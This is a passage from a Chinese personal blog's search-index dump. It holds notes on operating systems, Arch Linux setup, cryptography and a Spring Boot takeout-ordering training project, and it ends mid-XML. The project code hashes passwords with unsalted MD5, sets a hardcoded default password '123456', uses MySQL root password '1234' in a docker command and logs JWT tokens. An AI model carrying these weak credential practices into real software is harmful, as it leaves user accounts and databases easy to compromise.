Core Dump 的命令（或设一个合理的大小限制），确保程序崩溃时能生成 Core 文件\n适合于 production systems\n通过设置 core dump size，我们可以在程序发生 core dump 时保存到文件系统，并且在后续使用 gdb 调试它,但是 GDB 无法基于它继续执行\n用 CRIU （Checkpoint/Restore In Userspace）解决\n自己设计可执行文件？\n满足回归链接和加载中的核心概念：代码、符号、重定位，就可以了\n生成可执行文件地过程\n源代码 (.c) → 源代码 (.i)\nCtrl-C \u0026amp; Ctrl-V (#include)\n字符串替换\n今天：我们有过程宏\n源代码 (.i) → 汇编代码 (.s)\n“高级状态机” 到 “低级状态机” 的翻译\n最终生成带标注的指令序列\n汇编代码 (.s) → 目标文件 (.o)\n文件 = sections (.text, .data, .rodata.str.1, \u0026hellip;) 对于 ELF，每个 section 有它的权限、内存对齐等信息 section 中的三要素 代码 (字节序列) 符号：标记 “当前” 的位置 重定位：暂时不能确定的数值 (链接时确定) 多个目标文件 (.o) → 可执行文件 (a.out)\n合并所有的 sections 分别合并 .text, .data, .bss 中的代码 把 sections “平铺” 成字节序列 确定所有符号的位置 解析全部重定位 得到一个可执行文件 最后，把字节序列搬到内存，执行\n操作系统和加载器\nexecve(path, argv, envp)\n操作系统内核解析 path、完成加载 # 注释的作用 -\u0026gt; 指示解释器路径 ","date":"2025-11-07T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"操作系统"},{"content":"参考：https://jyywiki.cn/OS/\n操作系统概述 1940s 的计算机（ENIAC）：\n逻辑门：真空电子管 延迟线内存通过 “抛球” 来扩大存储空间 没有操作系统！只需要执行程序即可 1950s：\n磁芯内存 可以执行更复杂的任务，希望调用 API 而不是直接访问设备 在只有一个 CPU 的情况下，需要管理多个程序执行 1960s：\n内存更大，意味着可以放多个程序到内存里 需要操作系统介入，实现多程序同时运行 还需要硬件变化，在多个地址隔离的程序间切换 1970s+：\n基本现代化 程序和编译器 状态机：数字逻辑电路的模拟器\n寄存器存储 + 运行逻辑 + 按照时间周期运行 \u0026ndash;\u0026gt; 状态转换\n程序就是状态机！\n程序的状态有什么？\n变量？全局 or 局部？ 函数调用、函数返回是什么？ \u0026ndash;\u0026gt; 栈帧的处理，调用是PUSH，返回是 POP 程序 = 计算 + syscall\n加上了系统调用，将操作权交给系统。 编译器\n优化可优化的部分，转义不可优化的部分 状态机的初始状态（lib-64-linux/\u0026hellip;）等等都有定义，都建立在确定的基础上。\ngdb、strace、binutils 追踪\n并发 多处理器编程 原子性 并发的基础：多线程\n线程共享内存、具有独立堆栈 如何验证？ \u0026ndash;\u0026gt; strace…… 带来的问题：\n多线程共用变量时，发生冲突 基本假设不再成立：程序不再独占处理器执行 解决：实现原子性\n将大人物切分为可以并行的小任务 用 worker thread 去锁保护的队列里取任务 顺序 编译器默认程序时顺序执行的，以进行优化；但是多线程时顺序不一定成立\n可见性 处理器同时也是编译器，能够同时执行一个线程的指令\n即便是汇编，也可能产生步骤乱序执行 需要放弃对旧的“程序”的理解\n理解并发程序执行 Peterson 算法 举旗，两个共享变量实现并发？\n用贴对方的标签来竞争 如何证明正确性？\n画状态机？枚举所有可能性 PC 的含义 \u0026ndash;\u0026gt; 指令的步骤++ 用 python 来检测！选对语言 py 的特性，yield\n只要能位系统建立模型，就能证明正确 / 找到错误\n将问题转化为图论问题\n在多处理器上实现线程隔离 虚拟化 程序和进程 程序是状态机的静态描述 描述了所有可能的程序状态 程序 (动态) 运行起来，就成了进程 (进行中的程序) 可以使用文件 API (“everything is a file”) 访问当前进程的 ID、状态信息、命令行参数和工作目录等元数据。 进程（状态机）管理 操作系统 = 状态机的管理者\n创建状态机：spawn(path, argv) 销毁状态机: _exit() 复制状态机: fork() 完整复制状态机；新创建的状态机返回值为 0，执行 fork() 的进程会返回子进程的进程号。 pritf 的输出机制，输出到缓冲区 复位状态机: execve() 参数 path、argv、evnp windows 与 Unix 管理进程的 API 不同\n进程的地址空间 进程的初始状态\n寄存器\nABI 中规定了 initial state 只规定了部分寄存器和栈 (argv 和 envp 中的字符串保存在栈中) 内存\nBinary 中指定的 PT_LOAD 段\n内存是分成 “一段一段” 的 每一段有访问权限 (rwx) 只有\nELF 文件里声明的\n内存和一些操作系统分配的内存\n任何其他指针的访问都是非法的 所以需要能够动态分配！ 进程的地址空间管理\n在状态机状态上增加/删除/修改一段可访问的内存 MAP_ANONYMOUS: 匿名 (申请) 内存 fd: 把文件 “搬到” 进程地址空间中 (例子：加载器) 1 2 3 4 5 6 7 // 映射 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); int munmap(void *addr, size_t length); // 修改映射权限 int mprotect(void *addr, size_t length, int prot); 可以用 pmap 命令查看进程的地址空间 瞬间完成内存分配 mmap/munmap 为 malloc/free 提供了机制 libc 的大 malloc 会直接调用一次 mmap 实现 pmap 命令通过读取 /proc/[pid]/maps 和 /proc/[pid]/smaps 文件来获取进程的内存映射信息。Linux 内核将这些信息以文本形式暴露在 /proc 文件系统中，pmap 通过解析这些文件实现功能，而无需直接调用特定的系统调用。\n入侵地址空间\ngdb 的实现原理，可以任意观测、修改程序状态 小时候用的游戏修改器，需要多次读取数据，筛选后修改。原理就是监控游戏的整块内存。\n访问操作系统对象 先回顾一下操作系统创建的流程：一开始只有一个进程，然后通过 fork 产生出子进程，接着用 execve 来替换子进程为目标进程，再用 mmap 来分配空间\n文件描述符\n是指向操作系统对象的 “指针”——系统调用通过这个指针 (fd) 确定进程希望访问操作系统中的哪个对象。我们有 open, close, read/write, lseek, dup 管理文件描述符。 对象的访问都需要指针 open, close, read/write (解引用), lseek (指针内赋值/运算), dup (指针间赋值) 在 fork 的时候，文件描述符继承吗？ 继承（UNIX中），方便但是危险 “文件”：有名字的数据对象，Everything is a file 操作系统中的对象\n真实的设备 /dev/sda 虚拟的设备（文件） /dev/urandom，/dev/null，并没有实际文件，但是操作系统为它们实现了特别的read、write操作 管道：特殊的文件流 读口支持 read，写口支持 write 整合起来，就是所有的基础知识：\n进程管理\nfork, execve, waitpid, exit 内存管理\nmmap, munmap, mprotect, msync 文件管理\nopen, close, read, write, lseek, dup 一切皆文件的利弊：\n一套 API 可以访问所有对象,便捷 一切都可以 | grep 但是涉及多义性、复杂项目下不便、耦合度高、高速设备不友好… 终端和 UNIX shell 终端的历史，其实就是直接控制硬件（打字机、繁重而昂贵的操作系统）的输入 - 输出互动的窗口\n今天则用伪终端（Pseudo Terminal）来模拟\n用户登录的起点\n系统启动 (内核 → init → getty) 远程登录 (sshd → fork → openpty) stdin, stdout, stderr 都会指向分配的终端 vscode (fork → openpty) login 程序继承分配的终端\n(是的，login 是一个程序) fork() 会继承文件描述符 (指针) 因此，子进程也会指向同一个终端 终端的机制\n怎么确定要控制的是那个终端/进程？（比如Ctrl + C） 只管传输字符 –\u0026gt; 由操作系统来决定如何对“当前”进程采取行动 历史遗留问题，局限性：无法预知软件的未来 要做的是进行抽象，不要在把高层“意图”翻译成低层“规程”上花费脑力和时间 Shell编程\n基于文本替换的极简编程语言！\n预处理: $(), \u0026lt;()\n重定向: cmd \u0026gt; file \u0026lt; file 2\u0026gt; /dev/null\n顺序结构: cmd1; cmd2, cmd1 \u0026amp;\u0026amp; cmd2, cmd1 || cmd2\n管道:\n1 cmd1 | cmd2 这些命令被翻译成系统调用序列 (open, dup, pipe, fork, execve, waitpid, …) C 标准库和实现 API 的设计有一个有趣的原则：“非必要不实现” (“机制与策略分离”、“最小完备性原则”)：但凡应用程序能自己搞定的功能，操作系统就不需要提供——在一定程度上，这样的设计能防止 “包揽一切” 导致代码膨胀，甚至在长期演化的过程中成为历史的包袱。\nC 是一种 “高级汇编语言” 作为对比，C++ 更好用，但也更难移植 系统调用的一层 “浅封装” libc 大部分可以用 C 语言本身实现 少部分需要一些 “底层支持” 例子：体系结构相关的内联汇编 “最小完备性原则” 和 “机制策略分离” 的反面教材 “每一个 malloc 在任何可能路径上都必有一次配对的 free，且之后不再使用” 在复杂系统里太难保证了 脱离 workload 做优化就是耍流氓\n在开始考虑性能之前，理解你需要考虑什么样的性能 可执行文件 是什么\nELF 是 Executable and Linkable Format 的缩写，是 Linux 系统上的一种可执行文件格式。\n一个操作系统中的对象 (文件) 一个字节序列 (我们可以把它当字符串编辑) 一个描述了状态机初始状态的数据结构 需要什么\n一个头 (类似 7f 45 4c 46; 这是一个 jg 71) 一段 Trampoline Code (PIC) 操作系统会给一个文件描述符 (指向文件本身) 这段代码直接执行 hardcoded mmap (就能实现 “加载” 的功能) 反思\nELF 不是一个人类友好的 “状态机数据结构描述” 为了性能，彻底违背了可读 (“信息局部性”) 原则 Crash (SIGSEGV, SIGABRT, SIGILL, …) 时会做 core dump ulimit -c unlimited：启用 Core Dump 的命令（或设一个合理的大小限制），确保程序崩溃时能生成 Core 文件 适合于 production systems 通过设置 core dump size，我们可以在程序发生 core dump 时保存到文件系统，并且在后续使用 gdb 调试它,但是 GDB 无法基于它继续执行 用 CRIU （Checkpoint/Restore In Userspace）解决 自己设计可执行文件？\n满足回归链接和加载中的核心概念：代码、符号、重定位，就可以了\n生成可执行文件地过程\n源代码 (.c) → 源代码 (.i) Ctrl-C \u0026amp; Ctrl-V (#include) 字符串替换 今天：我们有过程宏 源代码 (.i) → 汇编代码 (.s) “高级状态机” 到 “低级状态机” 的翻译 最终生成带标注的指令序列 汇编代码 (.s) → 目标文件 (.o) 文件 = sections (.text, .data, .rodata.str.1, …) 对于 ELF，每个 section 有它的权限、内存对齐等信息 section 中的三要素 代码 (字节序列) 符号：标记 “当前” 的位置 重定位：暂时不能确定的数值 (链接时确定) 多个目标文件 (.o) → 可执行文件 (a.out) 合并所有的 sections 分别合并 .text, .data, .bss 中的代码 把 sections “平铺” 成字节序列 确定所有符号的位置 解析全部重定位 得到一个可执行文件 最后，把字节序列搬到内存，执行 操作系统和加载器\nexecve(path, argv, envp)\n操作系统内核解析 path、完成加载 # 注释的作用 -\u0026gt; 指示解释器路径 链接和加载 当开发者希望把库函数和应用程序 “分离” 开，但又希望库函数可以被调用，此时就需要动态链接\n动态链接：机制\n实现运行库和应用代码分离\n应用之间的库共享\n每个程序都需要 glibc\n但系统里只需要\n一个副本\n就可以了\n是的，我们可以用 ldd 命令查看 运行库和应用代码还可以分别独立升级 大型项目的分解\n改一行代码不用重新链接 2GB 的文件 libjvm.so, libart.so, \u0026hellip;共享库文件 只读方式 mmap 同一个文件，物理内存中只有一个副本，分页的机制，使得内存的处理更灵活，无需多个物理副本\n问题：怎么判断是否需要链接进来共享库？\n动态链接的本质是 “运行时绑定地址”，PLT/GOT 是实现这一逻辑的底层表；环境变量 LD_PRELOAD 则是利用动态链接的加载顺序，实现库的 “运行时替换”（加入本地的库）。 ","date":"2025-11-07T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"操作系统"},{"content":"缩放问题 原因其实是因为这些软件默认运行在XWayland下（VSCode、Spotify），有的不支持Wayland（微信）。终端运行xprop，将光标放到软件界面，如变成十字则软件运行在Xwayland。\n解决方法 参考：Gnome(Wayland)相关问题\n针对缩放模糊问题，目前最好的方法就是不进行分数缩放，而是通过整数缩放+字放大体的方式调整\n","date":"2025-11-04T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E6%8A%80%E6%9C%AF%E6%9D%82%E9%A1%B9-arch%E9%97%AE%E9%A2%98%E5%A4%87%E4%BB%BD/","title":"Arch 问题备份"},{"content":" 好几天没写博客了，一是期中考，二是不知道要学些什么了。网上看见推荐 Linux 系统的文章，正好试一试自己装系统。\n安装 安装花了大概一天时间，参考了 Arch Linux 简明指南，没什么太大问题。主要是教程中的做法是将 Arch 的 boot 挂载到了 Win 里面，做下来发现 Win 的 EFi 分区已经满了……\n然后就是研究怎么挂载到一个新的分区，和挂载顺序有比较大关系。\n大体步骤是：\nWindows 当中划分出空硬盘区 U盘拷贝镜像，做系统盘，把 Win 的磁盘解密 进 Bios 引导安装 用 cfdisk 对空闲盘进行分区，swap、boot、btrfs 划分子卷，挂载分区 启动！ 配置 配置还是比较伤脑筋的，首先是适应安装工具 pacman。大概就是一个官方提供的包管理工具，需要自己换源。后续还添加了yay、paru（第三方包库，资源丰富但是没有镜像站）、flatpak（体验比较好，速度能接受）。\n然后是桌面环境。尝试了 gnome、hyprland、niri 以后，都感觉不太适应，还没有从 win 的操作模式转换过来。主要是各个组件都要自己配。从 waybar、swaybg，到 bluez、swaylock，有很多选择，又眼花缭乱。并且每有体系化的教学、整合，就感觉很乱。\n比较喜欢 niri 的操作模式，觉得比较酷，就着重配置 niri 的环境了。比较麻烦的是截图，在 firefox 试了半天，发现 firefox 不能贴图……其实截图功能也已经比较完善了，基本能和 win 一样地操作。接下来是网络，被 yay、paru 的下载速度折磨了很久，clash 的机场又不太稳定了，不知道是哪里的问题。半天才发现 shell 需要额外配置代理……但速度还是不太能用，有机会再优化一下吧，先这样。\n其他 其实 Linux 也就是一个操作系统，不可能换了个系统就一劳永逸了，还是会有很多问题。算是满足自己的好奇心，去尝试一下新的可能。其实确实能感受到 Linux 的环境已经很完善了，比如现在写博客的流程，就能从 Win 复刻到 Linux 上。可能需要的就是一些解决问题的耐心。\n虽然把系统装好了，但是对原理没什么更多的理解，基本就是需求-碰到问题-搜索-解决问题，不能形成整体性的知识。既然装好了就试着用下去吧。\n","date":"2025-11-03T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251103190835625.png","permalink":"https://calendar0917.github.io/posts/%E6%8A%80%E6%9C%AF%E6%9D%82%E9%A1%B9-archlinux%E5%88%9D%E4%BD%93%E9%AA%8C/","title":"ArchLinux 安装及初步配置"},{"content":"引言与古典密码体制 基础知识 对称加密和公钥加密\n根据消息发送方和接收方使用的加密和解密密钥是否相同， 加密方案可分为对称加密和公钥加密。 ==公加私解== 消息认证码\n消息发送方和接收方首先共享一个密钥，发送方为待发送的消息产生一个标识，并将消息和标识一同发送给接收方。 用于标志消息息在传递过程中没有被篡改 哈希函数\n将任意长的消息映射为一个“较短的” “定长的” 抗碰撞的”消息摘要。\n用于保护数据完整性，防篡改\n数字签名\n在数字世界中实现了“手写签名”的功能，保证了被签名消息的完整性和不可否认性。 案基于公钥密码体制：发送者使用自己的私钥对消息进行签名，接收者使用签名者的公钥验证数字签名的合法性。 现代密码学发展史 1940 ==香农==证明了一次一密的安全性\n……\n加密 语法\nK 密钥空间\nM 明文空间：现代密码学中，M是二进制字符串的集合\nC 密文空间\n加密方案(Gen; Enc; Dec)\nGen ：K (概率性的) 密钥生成算法。 Enc : K x M→C 加密算法。 Dec : K x C →M 解密算法。 科尔霍夫原则\n密码算法的安全性应该依赖于密钥k的保密性,而不应依赖于算法 Gen;Enc; Dec 的保密性。 理由： 算法设计保密是不切实际的（逆向工程）。 短密钥更容易保护、生成和替换。 密码设计应该被公开讨论和分析。 古典密码 单表代换 移位密码：如凯撒密码、仿射密码 密文空间小时，直接爆破 密文空间大时，用字母频率猜测 多表代换 选择一串字符作为密钥，明文字符“加上”密钥字符得到密文字符 多表代换密码是安全的：密钥长度等于明文长度 当密钥长度小于明文长度时，多表代换密码易受到统计攻 击。 先确定密钥周期 拆分部分，分别频率检测 对称加密 完善保密性 基本概念\n高熵、均匀一致、随机 现代随机数生成步骤：收集高熵数据、产生几乎独立无偏的比特串 完善保密性\n获取密文的行为不改变敌手对所发送的实际消息的知识 密文不应泄露有关底层明文的额外信息 知识 vs 信息\n信息是公开可用的，可直观获取的。 知识是困难计算的结果，任何人都能有效获得的都不能称为知识。应用于公开可用信息的简单计算的结果不被认为是知识。应用于公共可用信息的难以计算的函数的结果是知识。\n流密码和分组密码 在实际中，PRG是使用流密码实例化的。 PRP是使用分组密码进行实例化的。实际上，PRP也被称为分组密码。 但是 Block cipher 不是一种加密方案 流密码 大致就是切分明文串来加密，密钥流是用单密钥随机产生的\n两种操作模式\n同步模式 有状态，消息按顺序接收、加密 异步模式 无状态，每个块密钥流独立 每个密钥流独立生成（有自己的生成器） 设计原则\n混淆原则\n使密钥和密文之间的依赖关系尽可能模糊。即使敌手获取了一些密文的统计特性,也无法推测密钥。常使用代替方法实现混淆。 扩散原则\n使明文和密文的关系变得尽可能的复杂,即密文中的每 一位受明文中的许多位的影响。常使用置换方法实现扩散 乘积密码\n也叫迭代密码,通过轮函数的多次迭代,对数据重复迭代操作,实现扩散与混淆 分组密码的迭代方式\n代换-置换SP网络(substitution-permutation)-Feistel网络 ","date":"2025-10-25T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%AF%86%E7%A0%81%E5%AD%A6/","title":"密码学"},{"content":"整体架构 参考：苍穹外卖项目(黑马)学习笔记DAY1_黑马外卖项目-CSDN博客、苍穹外卖——项目搭建_csdn管理端-CSDN博客\n企业软件开发流程\n需求分析（需求规格说明说、产品原型） 设计（UI设计、数据库设计、接口设计） 编码（项目代码、单元测试） 测试 上线运维 角色分工\n项目经理（对项目整体规划安排） 产品经理（需求分析） UI设计师 架构师 开发工程师 测试工程师 运维工程师 NGINX 配置 利用反向代理，实现负载均衡，隐藏内部服务器达到后端安全，以及提高访问速度。\n配置信息\nglobal：会影响 Nginx 服务器的整体行为比如运行 Nginx 的用户和用户组 events：配置 Nginx 的事件处理方式，包括连接数限制、事件模型等 http: 配置文件的核心，用于配置 HTTP 服务器的行为。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 http { include mime.types; default_type application/octet-stream; #log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; # \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; # \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; # 设置客户端和 Nginx 服务器之间的 Keep-Alive 连接的超时时间 keepalive_timeout 65; #gzip on; map $http_upgrade $connection_upgrade{ default upgrade; \u0026#39;\u0026#39; close; } upstream webservers{ server 127.0.0.1:8080 weight=90 ; #server 127.0.0.1:8088 weight=10 ; } # 每个 server 块代表一个特定的域名或端口的配置。 server { listen 80; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location / { root html/sky; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } # 反向代理,处理管理端发送的请求 location /api/ { proxy_pass http://localhost:8080/admin/; #proxy_pass http://webservers/admin/; } # 反向代理,处理用户端发送的请求 location /user/ { # 可以设置proxy_pass、proxy_set_header、proxy_redirect proxy_pass http://webservers/user/; } # WebSocket location /ws/ { proxy_pass http://webservers/ws/; proxy_http_version 1.1; proxy_read_timeout 3600s; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;$connection_upgrade\u0026#34;; } } 启动前创建启动目录：\n1 2 3 4 5 mkdir -p temp/client_body_temp mkdir -p temp/fastcgi_temp mkdir -p temp/proxy_temp mkdir -p temp/scgi_temp mkdir -p temp/uwsgi_temp 结构分析 sky-takeout\nsky-common sky-pojo sky-server 配置文件、配置类、拦截器、controller、service、mapper、启动类等 初始化 本地、远程仓库配置\n数据库配置（导入数据库设计文档）\n1 2 3 4 5 6 7 8 9 10 docker run -d \\ --name mysql-container \\ # 容器名称（自定义） -p 3306:3306 \\ # 端口映射（主机端口:容器端口） -e MYSQL_ROOT_PASSWORD=1234 \\ # root 用户密码（必填） # -e MYSQL_DATABASE=your_db \\ # 初始化时创建的数据库（可选） # -e MYSQL_USER=root \\ # 初始化时创建的用户（可选） # -e MYSQL_PASSWORD=user_password \\ # 上述用户的密码（可选） -v /root/docker/mysql:/var/lib/mysql \\ # 数据持久化（主机目录:容器内数据目录，已补充容器内路径） --restart=always \\ # 容器退出时自动重启（可选） mysql:5.7 # MySQL 镜像及版本 登录功能 数据库中的密码应该是加密后的形式，防止数据库泄露后用户密码的暴露。\n开发工具 APIFox 帮助看文档 Swagger-knief4j 调试工具 apifox 是设计阶段使用的工具，管理和维护接口 Swagger 在开发阶段使用的框架，帮助后端开发人员做后端的接口测试\n引入依赖：\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 配置类：WebMvcConfiguration.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * 通过knife4j生成接口文档 * @return */ @Bean public Docket docket() { ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) .select() .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } /** * 设置静态资源映射 * @param registry */ protected void addResourceHandlers(ResourceHandlerRegistry registry) { registry.addResourceHandler(\u0026#34;/doc.html\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/\u0026#34;); registry.addResourceHandler(\u0026#34;/webjars/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); } 使用说明：\n员工、分类管理 产品原型 比较直观，便于理解业务。 即业务实现的基础页面样式、传递的参数 设计接口 返回数据 表设计 看一下Result类怎么定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package com.sky.result; import lombok.Data; import java.io.Serializable; /** * 后端统一返回结果 * @param \u0026lt;T\u0026gt; */ @Data public class Result\u0026lt;T\u0026gt; implements Serializable { private Integer code; //编码：1成功，0和其它数字为失败 private String msg; //错误信息 private T data; //数据 public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; success() { Result\u0026lt;T\u0026gt; result = new Result\u0026lt;T\u0026gt;(); result.code = 1; return result; } public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; success(T object) { Result\u0026lt;T\u0026gt; result = new Result\u0026lt;T\u0026gt;(); result.data = object; result.code = 1; return result; } public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; error(String msg) { Result result = new Result(); result.msg = msg; result.code = 0; return result; } } 看一下 Constant 类怎么定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.sky.constant; /** * 公共字段自动填充相关常量 */ public class AutoFillConstant { /** * 实体类中的方法名称 */ public static final String SET_CREATE_TIME = \u0026#34;setCreateTime\u0026#34;; public static final String SET_UPDATE_TIME = \u0026#34;setUpdateTime\u0026#34;; public static final String SET_CREATE_USER = \u0026#34;setCreateUser\u0026#34;; public static final String SET_UPDATE_USER = \u0026#34;setUpdateUser\u0026#34;; } 员工添加流程 Controller 层中创建方法 1 2 3 4 5 6 7 @PostMapping @ApiOperation(\u0026#34;新增员工\u0026#34;) public Result save(@RequestBody EmployeeDTO employeeDTO){ log.info(\u0026#34;新增员工：{}\u0026#34;,employeeDTO); employeeService.save(employeeDTO);//该方法后续步骤会定义 return Result.success(); } Service 层中声明方法 1 void save(EmployeeDTO employeeDTO); Impl 具体实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public void save(EmployeeDTO employeeDTO) { Employee employee = new Employee(); //对象属性拷贝 BeanUtils.copyProperties(employeeDTO, employee); //设置账号的状态，默认正常状态 1表示正常 0表示锁定 employee.setStatus(StatusConstant.ENABLE); //设置密码，默认密码123456 employee.setPassword(DigestUtils.md5DigestAsHex(PasswordConstant.DEFAULT_PASSWORD.getBytes())); //设置当前记录的创建时间和修改时间 employee.setCreateTime(LocalDateTime.now()); employee.setUpdateTime(LocalDateTime.now()); //设置当前记录创建人id和修改人id employee.setCreateUser(10L);//目前写个假数据，后期修改 employee.setUpdateUser(10L); employeeMapper.insert(employee);//后续步骤定义 } Mapper 中实现插入 1 2 3 4 @Insert(\u0026#34;insert into employee (name, username, password, phone, sex, id_number, create_time, update_time, create_user, update_user,status) \u0026#34; + \u0026#34;values \u0026#34; + \u0026#34;(#{name},#{username},#{password},#{phone},#{sex},#{idNumber},#{createTime},#{updateTime},#{createUser},#{updateUser},#{status})\u0026#34;) void insert(Employee employee); 在application.yml中已开启驼峰命名，故id_number和idNumber可对应。\n1 2 3 4 mybatis: configuration: #开启驼峰命名 map-underscore-to-camel-case: true 完善 录入用户名冲突时，抛出的异常没处理\n通过添加全局处理器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // sky-server/com.sky.hander/GlobalExceptionHander.java\tpublic class GlobalExceptionHandler{ ...... /** * 处理SQL异常 * @param ex * @return */ @ExceptionHandler public Result exceptionHandler(SQLIntegrityConstraintViolationException ex){ //Duplicate entry \u0026#39;zhangsan\u0026#39; for key \u0026#39;employee.idx_username\u0026#39; String message = ex.getMessage(); if(message.contains(\u0026#34;Duplicate entry\u0026#34;)){ String[] split = message.split(\u0026#34; \u0026#34;); String username = split[2]; String msg = username + MessageConstant.ALREADY_EXISTS; return Result.error(msg); }else{ return Result.error(MessageConstant.UNKNOWN_ERROR); } } } 新增员工时，创建、修改人 id 为固定值\n需要动态获取当前用户信息 \u0026ndash;\u0026gt; jwt 拦截获取 id ，存入上下文\n拦截器的书写：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Component @Slf4j public class JwtTokenAdminInterceptor implements HandlerInterceptor { @Autowired private JwtProperties jwtProperties; /** * 校验jwt * * @param request * @param response * @param handler * @return * @throws Exception */ public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //判断当前拦截到的是Controller的方法还是其他资源 //识别到 Mapping...，会自动被包装为 HandlerMethod if (!(handler instanceof HandlerMethod)) { //当前拦截到的不是动态方法，直接放行 return true; } //1、从请求头中获取令牌 String token = request.getHeader(jwtProperties.getAdminTokenName()); //2、校验令牌 try { log.info(\u0026#34;jwt校验:{}\u0026#34;, token); Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token); Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString()); log.info(\u0026#34;当前员工id：\u0026#34;, empId); //3、通过，放行 return true; } catch (Exception ex) { //4、不通过，响应401状态码 response.setStatus(401); return false; } } } ThreadLocal：\n并不是一个Thread，而是Thread的局部变量。 为每个线程提供单独一份存储空间，具有线程隔离的效果，只有在线程内才能获取到对应的值，线程外则不能访问。 常用方法：\npublic void set(T value) 设置当前线程的线程局部变量的值 public T get() 返回当前线程所对应的线程局部变量的值 public void remove() 移除当前线程的线程局部变量 看一下封装了的 ThreadLocal 工具类\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 在sky-common/com.sky.context public class BaseContext { public static ThreadLocal\u0026lt;Long\u0026gt; threadLocal = new ThreadLocal\u0026lt;\u0026gt;(); public static void setCurrentId(Long id) { threadLocal.set(id); } public static Long getCurrentId() { return threadLocal.get(); } public static void removeCurrentId() { threadLocal.remove(); } } 分页查询 封装 EmployeePageQueryDTO 来接收参数\n封装 PageResult 对象，来返回分页参数\n包含总记录数、当前页数据集合\n1 2 3 4 5 6 7 @Data @AllArgsConstructor @NoArgsConstructor public class PageResult implements Serializable { private long total; //总记录数 private List records; //当前页数据集合 } 后续用 Result\u0026lt;PageResult\u0026gt; 返回\ncontroller 层\n1 2 3 4 5 6 7 @GetMapping @ApiOperation(value = \u0026#34;分页查询\u0026#34;) public Result\u0026lt;PageResult\u0026gt; pageQuery(@RequestParam EmployeePageQueryDTO employeePageQueryDTO){ log.info(\u0026#34;分页查询{}\u0026#34;,employeePageQueryDTO); PageResult pageResult = employeeService.pageQuery(employeePageQueryDTO); return Result.success(pageResult); } Service 层\n关注 PageHelper 的使用\n来自：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 public PageResult pageQuery(EmployeePageQueryDTO employeePageQueryDTO) { // SQL 语法：select * from employee limit 0,10 // 传入 startPage，然后查询，用 Page\u0026lt;T\u0026gt; 接收 PageHelper.startPage(employeePageQueryDTO.getPage(),employeePageQueryDTO.getPageSize()); Page\u0026lt;Employee\u0026gt; page = employeeMapper.pageQuery(employeePageQueryDTO); // 从封装好的 page 对象中取出结果 long total = page.getTotal(); List\u0026lt;Employee\u0026gt; records = page.getResult(); return new PageResult(total,records); } Mapper 复杂查询用 .xml 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.EmployeeMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;pageQuery\u0026#34; resultType=\u0026#34;com.sky.entity.Employee\u0026#34;\u0026gt; select * from employee \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null and name != 